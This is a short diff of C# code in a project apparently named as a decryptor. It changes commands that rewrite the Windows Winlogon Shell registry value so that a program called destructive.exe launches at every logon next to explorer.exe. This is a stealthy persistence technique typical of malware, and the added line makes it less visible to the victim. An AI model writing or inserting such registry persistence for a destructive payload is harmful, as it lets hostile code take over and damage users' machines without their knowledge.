@@ -116,7 +116,7 @@ namespace Winball501_Decryptor
             try
             {
                 System.Diagnostics.Process.Start("cmd.exe", "/c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /f");
-                System.Diagnostics.Process.Start("cmd.exe", "/c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"C:\\Program Files\\utkudrk2\\destructive.exe\" /f");
+                System.Diagnostics.Process.Start("cmd.exe", "/c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe, C:\\Program Files\\utkudrk2\\destructive.exe\" /f");
             }
             catch (Exception ex)
             {
